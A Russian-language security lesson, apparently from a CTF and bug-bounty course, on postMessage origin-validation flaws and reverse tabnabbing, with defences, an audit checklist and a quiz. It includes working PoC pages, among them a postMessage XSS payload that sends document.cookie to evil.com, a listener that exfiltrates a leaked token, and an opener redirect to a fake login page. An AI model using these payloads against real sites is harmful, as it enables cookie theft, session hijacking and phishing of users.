---
id: web-postmessage-tabnabbing
title: "postMessage и tabnabbing: атаки на межоконное взаимодействие"
category: web
parent: web-browser-core
difficulty: medium
order: 4
tags: [postmessage, tabnabbing, opener, xss, client-side]
prerequisites: [web-same-origin-cors, web-browser-security]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Как ошибки в postMessage и reverse tabnabbing позволяют перехватить окно жертвы, подменить страницу и украсть данные."
---

Межоконное взаимодействие (`postMessage`, `window.open`, `window.opener`) — это отдельный класс клиентских уязвимостей, который часто остаётся незамеченным: он не отражается в HTTP-запросах и не ловится обычными сканерами. Между тем ошибка в проверке `origin` при `postMessage` позволяет чужому сайту передавать данные в приложение, а `tabnabbing` — подменять страницу, к которой пользователь вернётся. Этот урок — про обе атаки и их эксплуатацию.

## postMessage: как работает

`window.postMessage(message, targetOrigin)` отправляет сообщение в другое окно/iframe. Приёмник ловит событие:

```js
window.addEventListener('message', (e) => {
  // ОШИБКА: нет проверки e.origin
  document.getElementById('out').innerHTML = e.data;
});
```

Если проверка `e.origin` отсутствует (или реализована неверно), любой сайт, открывший приложение в iframe или через `window.open`, может отправить произвольные данные — вплоть до DOM XSS.

## Ошибка 1: отсутствие проверки origin

```js
window.addEventListener('message', (e) => {
  eval(e.data);                 // критично
  location = e.data;            // open redirect
  document.write(e.data);       // DOM XSS
  document.body.innerHTML += e.data;
});
```

Эксплуатация:

```html
<iframe src="https://victim.com/widget" id="f"></iframe>
<script>
document.getElementById('f').onload = () => {
  document.getElementById('f').contentWindow.postMessage('<img src=x onerror=alert(1)>', '*');
};
</script>
```

## Ошибка 2: неверная проверка origin

Частые ошибки: `indexOf`/`includes`/`startsWith` вместо строгого `===`, проверка только протокола, отсутствие проверки при отправке.

```js
// уязвимо: indexOf
if (e.origin.indexOf('victim.com') !== -1) { /* evil-victim.com пройдёт */ }
// уязвимо: startsWith
if (e.origin.startsWith('https://victim.com')) { /* victim.com.evil.com пройдёт */ }
// уязвимо: проверка e.source, но не origin
if (e.source === parent) { /* любой origin, но нужное окно */ }
```

Байпас-варианты origin: `https://victim.com.evil.com`, `https://evil-victim.com`, `https://evil.com/victim.com`, `null`, `http://victim.com`.

## Ошибка 3: `targetOrigin: '*'` при отправке

Если приложение само отправляет `postMessage(data, '*')`, данные (иногда с токенами) уходят в любое окно, включая враждебное.

```js
// приложение
otherWindow.postMessage({token: sessionToken}, '*');   // токен утёк
```

Атакующий открывает приложение и читает сообщение:

```js
window.addEventListener('message', e => fetch('https://evil.com/?t='+e.data.token));
```

## Tabnabbing и reverse tabnabbing

**Tabnabbing** — классика: жертва уходит на другой таб, атакующий подменяет содержимое исходной страницы на фейковый логин; вернувшись, пользователь вводит пароль. **Reverse tabnabbing** — когда открытая через `target=_blank` страница получает доступ к `window.opener` и перенаправляет исходную страницу.

```html
<!-- уязвимая ссылка: нет rel="noopener noreferrer" -->
<a href="https://evil.com" target="_blank">Открыть</a>
```

```js
// на evil.com
if (window.opener) window.opener.location = 'https://evil.com/fake-login';
```

Защита — `rel="noopener noreferrer"` или `noopener` в `window.open`. Проверяйте все внешние ссылки с `target="_blank"`.

## window.name и другие векторы

`window.name` сохраняется между навигациями и может использоваться для передачи данных между origin'ами. Если приложение читает `window.name` и вставляет в DOM — это XSS.

```js
const data = window.name;         // сохраняется при переходах
document.getElementById('x').innerHTML = data;
```

## Инструменты и поиск

```bash
# ищем postMessage в бандлах
katana -u https://t -jc -silent | grep -E '\.js' | sort -u > js.txt
while read u; do curl -s "$u"; done < js.txt | grep -nE 'postMessage|addEventListener\(.message'
# ищем отсутствие проверки origin
while read u; do curl -s "$u"; done < js.txt | grep -B2 -A2 'message' | grep -v 'e.origin'
# ищем target=_blank без noopener
curl -s https://t/ | grep -oE '<a [^>]*target="_blank"[^>]*>' | grep -v noopener
```

## Разобранный пример: DOM XSS через postMessage

```bash
# 1. находим обработчик без проверки origin
$ curl -s https://t/app.js | grep -A5 "addEventListener('message'"
window.addEventListener('message', (e) => {
  document.getElementById('chat').innerHTML = e.data;
});
# нет проверки e.origin -> уязвимо

# 2. создаём страницу-эксплойт
cat > exp.html <<'HTML'
<iframe src="https://t/chat" id="f"></iframe>
<script>
f.onload = () => f.contentWindow.postMessage('<img src=x onerror=fetch("https://evil.com/?c="+document.cookie)>','*');
</script>
HTML

# 3. жертва открывает exp.html -> cookie утекает на evil.com
```

Артефакт — cookie/DOM-данные на сервере атакующего.

## Разобранный пример: reverse tabnabbing

```bash
# 1. находим внешнюю ссылку без noopener
$ curl -s https://t/forum | grep -oE '<a href="https://[^"]+" target="_blank"'
<a href="https://evil.com" target="_blank">

# 2. на evil.com
cat > index.html <<'HTML'
<script>if (window.opener) window.opener.location='https://evil.com/fake-login';</script>
HTML
# 3. пользователь кликает -> исходная вкладка становится фейковым логином
```

## Крайние случаи и подводные камни

- **Проверка `e.origin === 'null'`** — тоже уязвимость: `null` приходит из sandbox/data-URL.
- **`e.source` не защищает** — сравнивать нужно origin, а не окно.
- **Вложенные iframe** — сообщение может прийти из вложенного окна с другим origin.
- **`window.opener` в самом приложении** — если приложение открывает чужие окна, оно тоже уязвимо.
- **`postMessage` с `*` и токенами** — утечка даже без XSS.
- **Service Worker** может перехватывать сообщения — проверяйте и его.

## Что делать дальше / решение

1. **Найдите обработчики** `message` в JS — есть ли проверка `e.origin`.
2. **Проверьте строгость** — `===` с полным origin, а не `indexOf`/`startsWith`.
3. **Проверьте отправку** — `postMessage(..., '*')` с чувствительными данными.
4. **Проверьте `target=_blank`** — есть ли `noopener`.
5. **Соберите PoC** — страница-iframe, отправляющая payload, либо reverse tabnabbing.
6. **Подтвердите артефакт** — cookie/DOM на вашем сервере.
7. **Тупик** — переходите к DOM XSS/CORS/XS-Leaks.

## Справочная таблица

| Вектор | Признак уязвимости | PoC |
|--------|--------------------|-----|
| postMessage приём | нет проверки `e.origin` | iframe + postMessage |
| слабая проверка | `indexOf`/`startsWith` | evil-victim.com |
| отправка | `targetOrigin: '*'` | перехват через opener |
| reverse tabnabbing | `target=_blank` без `noopener` | `opener.location=...` |
| window.name | чтение и вставка в DOM | навигация + XSS |
| `Origin: null` | доверие `null` | sandbox-iframe |

## Взаимодействие с Service Worker и вложенными iframe

Если приложение регистрирует Service Worker, сообщения могут проходить через него. SW способен перехватывать `fetch`, кэшировать ответы и даже подменять их — это расширяет поверхность атаки. При аудите проверяйте, не обрабатывает ли SW `message`-события и не доверяет ли он им без проверки origin.

Вложенные iframe добавляют путаницу: сообщение приходит от окна с origin, который может отличаться от origin верхнего документа. Проверка только `e.source` (а не `e.origin`) даёт ложное чувство защищённости: атакующий может организовать нужную цепочку окон.

```js
// опасно: доверие вложенному окну по source
window.addEventListener('message', e => {
  if (e.source === document.getElementById('inner').contentWindow) {
    doSensitive(e.data);   // origin не проверен
  }
});
```

Правильно — проверять и origin, и при необходимости source, причём origin строгим сравнением.

## Защита и как её обходят

Правильная защита состоит из трёх частей: (1) при приёме — строгая проверка `e.origin === 'https://trusted.com'`; (2) при отправке — конкретный `targetOrigin`, а не `'*'`; (3) для внешних ссылок — `rel="noopener noreferrer"` или `window.open(url, '_blank', 'noopener')`. Обходят эту защиту тремя путями: находят обработчик вообще без проверки, находят слабую проверку (`indexOf`/`startsWith`) или эксплуатируют доверенный, но скомпрометированный origin (поддомен с XSS, `null`-песочница).

Отдельно проверьте, не доверяет ли приложение `document.referrer` вместо origin: referrer подделывается через открытые редиректы, а `Origin: null` приходит из sandbox-iframe. Комбинация «доверие null + отсутствие проверки source» — типичная критичная находка.

## Чек-лист аудита межоконного взаимодействия

- [ ] Все ли обработчики `message` проверяют `e.origin`?
- [ ] Проверка строгая (`===`), а не `indexOf`/`startsWith`/`includes`?
- [ ] Не доверяется ли `Origin: null`?
- [ ] Не отправляются ли чувствительные данные с `targetOrigin: '*'`?
- [ ] Все внешние `target="_blank"` имеют `rel="noopener"`?
- [ ] Не читается ли `window.name` и не вставляется ли в DOM?
- [ ] Не обрабатывает ли Service Worker сообщения без проверки?
- [ ] Собран ли PoC (iframe/postMessage или reverse tabnabbing)?

## Что делать дальше / решение

Нашли обработчик без проверки origin — сразу стройте PoC-страницу с iframe и `postMessage` и подтверждайте артефактом (cookie/DOM-данные на вашем сервере). Слабая проверка (`indexOf`) — подберите домен, который её обходит. `targetOrigin: '*'` — перехватите сообщение через `window.open` и свой listener. `target=_blank` без `noopener` — продемонстрируйте reverse tabnabbing. Если всё закрыто, переходите к соседним клиентским классам: CORS-мисконфиг, XS-Leaks, DOM clobbering. И фиксируйте каждый тупик, чтобы не возвращаться к нему без новой информации.

## Практика: полный цикл поиска

Разберём, как искать межоконные уязвимости системно, а не наугад. Первый шаг — собрать весь JavaScript приложения и найти точки, где приложение слушает или отправляет сообщения. `postMessage` и `addEventListener('message')` — редкие строки, их легко найти грепом по бандлам.

```bash
# 1. собрать JS
katana -u https://t -jc -d 3 -silent | grep -E '\.js' | sort -u > js.txt
# 2. найти все вхождения message/postMessage
while read u; do echo "== $u"; curl -s "$u" | grep -nE 'postMessage|addEventListener\(["'\'']message'; done < js.txt
# 3. отдельно найти обработчики без проверки origin
while read u; do curl -s "$u"; done < js.txt | grep -A4 "addEventListener('message'" | grep -c "e.origin"
```

Второй шаг — проверить каждую находку руками. Для приёмника: создать iframe, отправить payload, посмотреть, что произошло в DOM. Для отправителя: открыть приложение через `window.open`, поставить свой listener, перехватить сообщение. Для `target=_blank`: проверить наличие `rel="noopener"` и продемонстрировать подмену `opener.location`.

Третий шаг — оценить серьёзность. DOM XSS через `postMessage` — это критично (выполнение кода в контексте жертвы). Утечка токена через `targetOrigin: '*'` — тоже критично (захват сессии). Reverse tabnabbing — обычно средний уровень (требует возврата пользователя и ввода данных), но в связке с фишингом может быть высоким. Утечка `window.name` без вставки в DOM — низкий уровень.

Четвёртый шаг — собрать PoC и записать. Для каждого вектора нужна минимальная HTML-страница, воспроизводящая атаку. Это и есть доказательство, которое идёт в отчёт. Не ограничивайтесь описанием «обработчик не проверяет origin» — покажите, что именно утекает и куда.

```html
<!-- минимальный PoC для приёмника без проверки origin -->
<!doctype html><iframe src="https://t/widget" id=f></iframe>
<script>f.onload=()=>f.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>','*')</script>
```

Такой PoC работает из файла, с любого домена и не требует ничего, кроме браузера — это делает его убедительным для баг-баунти и CTF.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Что обязан проверять получатель `message`?"
  options:
    - "`e.origin` по whitelist"
    - "`e.data` на длину"
    - "`document.cookie`"
    - "`navigator.userAgent`"
  answer: 0
  explanation: "Без проверки origin любой сайт может слать данные в обработчик."
- question: "Чем опасен `postMessage(secret, '*')`?"
  options:
    - "Секрет уйдёт любому окну, получившему ссылку"
    - "Он шифрует секрет"
    - "Он меняет cookie"
    - "Он замедляет сайт"
  answer: 0
  explanation: "`'*'` не ограничивает получателя."
- question: "Что такое reverse tabnabbing?"
  options:
    - "Новая вкладка через `window.opener` подменяет исходную страницу"
    - "Отравление DNS"
    - "SQL-инъекция"
    - "Отравление кэша"
  answer: 0
  explanation: "Без `rel='noopener'` открытая страница управляет исходной."
- question: "Как защититься от tabnabbing?"
  options:
    - "`rel='noopener'` (или COOP)"
    - "`HttpOnly`"
    - "`SameSite`"
    - "`nosniff`"
  answer: 0
  explanation: "`noopener` (и `COOP`) убирают доступ к `window.opener`."
- question: "Даже при верной проверке origin что может быть опасно?"
  options:
    - "Запись `e.data` в `innerHTML`"
    - "Проверка длины"
    - "Использование `postMessage`"
    - "Отправка `'*'` отправителем"
  answer: 0
  explanation: "Если отправитель скомпрометирован, `innerHTML` даст XSS."
```

## Где пригодится

- **CTF (Web):** задачи на iframe/postMessage-XSS и tabnabbing.
- **Bug bounty:** postMessage без проверки origin — частый клиентский баг.
- **Пентест:** аудит виджетов, OAuth-попапов, UGC-ссылок.
- **Работа (AppSec/Dev):** проверка origin, точный `targetOrigin`, `noopener`, COOP.
